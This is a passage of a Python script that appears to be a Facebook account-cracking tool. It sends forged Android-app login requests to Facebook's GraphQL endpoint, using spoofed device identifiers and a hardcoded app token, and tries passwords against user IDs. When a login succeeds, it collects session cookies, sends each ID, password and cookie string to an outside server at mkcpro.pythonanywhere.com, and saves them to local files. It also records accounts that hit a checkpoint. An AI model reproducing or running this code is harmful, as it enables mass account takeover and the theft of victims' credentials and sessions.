                enc_pass = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
                data = {
    'method': 'post',
    'pretty': 'false',
    'format': 'json',
    'server_timestamps': 'true',
    'locale': '-',
    'purpose': 'fetch',
    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
    'fb_api_caller_class': 'graphservice',
    'client_doc_id': '11994080424240083948543644217',
    'variables': json.dumps({
        "params": {
            "params": json.dumps({
                "client_input_params": json.dumps({
                    "sim_phones": [],
                    "secure_family_device_id": str(uuid.uuid4()),
                    "auth_secure_device_id": "",
                    "has_whatsapp_installed": 1,
                    "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0],pw),
                    "sso_token_map_json_string": "",
                    "event_flow": "login_manual",
                    "sim_serials": [],
                    "client_known_key_hash": "",
                    "encrypted_msisdn": "",
                    "should_show_nested_nta_from_aymh": 0,
                    "device_id": str(uuid.uuid4()),
                    "login_attempt_count": 1,
                    "machine_id": "btqmzg6mx6h3dr2bnwn82yvj",
                    "flash_call_permission_status": json.dumps({
                        "READ_PHONE_STATE": "DENIED",
                        "READ_CALL_LOG": "DENIED",
                        "ANSWER_PHONE_CALLS": "DENIED"
                    }),
                    "accounts_list": [],
                    "family_device_id": str(uuid.uuid4()),
                    "fb_ig_device_id": [],
                    "device_emails": [],
                    "try_num": 3,
                    "lois_settings": json.dumps({
                        "lois_token": "",
                        "lara_override": ""
                    }),
                    "event_step": "home_page",
                    "headers_infra_flow_id": "",
                    "openid_tokens": {},
                    "contact_point": uid
                }),
                "server_params": json.dumps({
                    "should_trigger_override_login_2fa_action": 0,
                    "is_from_logged_out": 0,
                    "should_trigger_override_login_success_action": 0,
                    "login_credential_type": "none",
                    "server_login_source": "login",
                    "waterfall_id": str(uuid.uuid4()),
                    "login_source": "Login",
                    "is_platform_login": 0,
                    "pw_encryption_try_count": 1,
                    "INTERNALlatency_qpl_marker_id": 36707139,
                    "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                    "is_from_landing_page": 0,
                    "password_text_input_id": "5tm5yt:28",
                    "is_from_empty_password": 0,
                    "ar_event_source": "login_home_page",
                    "username_text_input_id": "zfiojk:27",
                    "layered_homepage_experiment_group": "",
                    "device_id": str(uuid.uuid4()),
                    "INTERNALlatency_qpl_instance_id": "0.7186605966306517",
                    "reg_flow_source": "login_home_native_integration_point",
                    "is_caa_perf_enabled": 1,
                    "credential_type": "password",
                    "is_from_password_entry_page": 0,
                    "caller": "gslr",
                    "family_device_id": str(uuid.uuid4()),
                    "INTERNAL_INFRA_THEME": "harm_f,default,harm_f",
                    "is_from_assistive_id": 0,
                    "access_flow_version": "F2_FLOW",
                    "is_from_logged_in_switcher": 0
                })
            }),
            "bloks_versioning_id": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722",
            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
        },
        "scale": "47",
        "nt_context": json.dumps({
            "using_white_navbar": "True",
            "pixel_ratio": 3,
            "is_push_on": "False",
            "styles_id": "196702b4d5dfb9dbf1ded6d58ee42767",
            "bloks_version": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722"
        })
    }),
    'fb_api_analytics_tags': '["GraphServices"]',
    'client_trace_id': 'fbdebb2c-20c4-4dae-a956-ecbfae63f0ec'
}
                paramas = {
    "method": "post",
    "pretty": "false",
    "format": "json",
    "server_timestamps": "true",
    "locale": "-",
    "purpose": "fetch",
    "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
    "fb_api_caller_class": "graphservice",
    "client_doc_id": "11994080424240083948543644217",
    "variables": {
        "params": {
            "params": '{"client_input_params":"{\"sim_phones\":[],\"secure_family_device_id\":\"b9a61626-fa7c-4861-8767-c1e6da01c6dc\",\"auth_secure_device_id\":\"\",\"has_whatsapp_installed\":1,\"password\":\"#PWD_FB4A:0:1750684174:838394\",\"sso_token_map_json_string\":\"\",\"event_flow\":\"login_manual\",\"sim_serials\":[],\"client_known_key_hash\":\"\",\"encrypted_msisdn\":\"\",\"should_show_nested_nta_from_aymh\":0,\"device_id\":\"e5603942-884b-4fe6-92d5-91a9f20a4860\",\"login_attempt_count\":1,\"machine_id\":\"93zxslwjtb7qizoe21we910k\",\"flash_call_permission_status\":\"{\\\"READ_PHONE_STATE\\\":\\\"DENIED\\\",\\\"READ_CALL_LOG\\\":\\\"DENIED\\\",\\\"ANSWER_PHONE_CALLS\\\":\\\"DENIED\\\"}\",\"accounts_list\":[],\"family_device_id\":\"83914afd-9840-47b5-9210-b2b96234b0e3\",\"fb_ig_device_id\":[],\"device_emails\":[],\"try_num\":3,\"lois_settings\":\"{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"}\",\"event_step\":\"home_page\",\"headers_infra_flow_id\":\"\",\"openid_tokens\":{},\"contact_point\":\"8383941953\"}"}',
            "server_params": '{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":"fb23d1ca-e80a-46b4-8577-6546ec37d40a","login_source":"Login","is_platform_login":0,"pw_encryption_try_count":1,"INTERNAL__latency_qpl_marker_id":36707139,"offline_experiment_group":"caa_iteration_v6_perf_fb_2","is_from_landing_page":0,"password_text_input_id":"pijnxb:28","is_from_empty_password":0,"ar_event_source":"login_home_page","username_text_input_id":"o7i143:62","layered_homepage_experimnt_group":"","device_id":"f636f5ad-e27e-464d-96af-cdc57ee227e8","INTERNAL__latency_qpl_instance_id":"0.5827769600175628","reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":"556c8fb8-0b9a-49d0-8d23-002972ac7e25","INTERNAL_INFRA_THEME":"harm_f,default,harm_f","is_from_assistive_id":0,"access_flow_version":"F2_FLOW","is_from_logged_in_switcher":0}',
        },
        "bloks_versioning_id": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722",
        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
    },
    "scale": "61",
    "nt_context": '{"using_white_navbar":"True","pixel_ratio":3,"is_push_on":"False","styles_id":"196702b4d5dfb9dbf1ded6d58ee42767","bloks_version":"c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722"}'
}
                headers =  {
            'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 9; GM1901 Build/SP1A.115640.652) [FBAN/FB4A;FBAV/517.0.0.70.92;FBBV/462428432;FBDM/{density=3.0,width=1080,height=2340};FBLC/tr_TR;FBRV/462428432;FBCR/Roshan;FBMF/OnePluse;FBBD/OnePluse;FBPN/com.facebook.katana;FBDV/GM1901;FBSV/9;FBCA/x86:x86_64;]',
            'accept-encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'authority': 'b-graph.facebook.com',
            'method': 'POST',
            'path': '/graphql',
            'scheme': 'https',
            'x-fb-ta-logging-ids': 'graphql:ddea93c5-33a6-4f43-aeeb-830b902836d8',
            'x-tigon-is-retry': 'True',
            'x-fb-device-group': '6487',
            'x-fb-connection-type': 'WIFI',
            'content-encoding': 'gzip',
            'x-fb-privacy-context': '3643298472347298',
            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
            'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"2"},"application_tags":"graphservice"}',
            'x-graphql-client-library': 'graphservice',
            'x-fb-net-hni': '47004',
            'x-fb-sim-hni': '47004',
            'x-fb-background-state': '1',
            'x-graphql-request-purpose': 'fetch',
            'content-type': 'application/x-www-form-urlencoded',
            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'False',
            'x-fb-server-cluster': 'True',
            'Content-Length': '0',}
                url = "https://graph.facebook.com/graphql?"
                response = ses.post(url, paramas, data=data, headers=headers).json()
                if "session_key" in response:
                    cookies_ = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    send = requests.get(f"https://mkcpro.pythonanywhere.com/api?id={uid}|{pw}|{cookies_}").json()
                    print(f"{G}[DEV-OK] {uid}|{pw}{X}")
                    print(f"{R}[{G}Cookies{R}] {G}{cookies_}{X}")
                    open("/sdcard/DEV-OK.txt","a").write(f"{uid}|{pw}|{cookies_}\n")
                    self.okss.append(uid+"|"+pw)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"{R}[DEV-CP] {uid}|{pw}{X}")
                    open("/sdcard/DEV-CP.txt","a").write(uid+"|"+pw+"\n")
                    self.cpss.append(uid+"|"+pw)
                    break
                else:
                    continue
            self.loop+=1
        except CE:
            time.sleep(10)
        except Exception as error:
            pass

start()
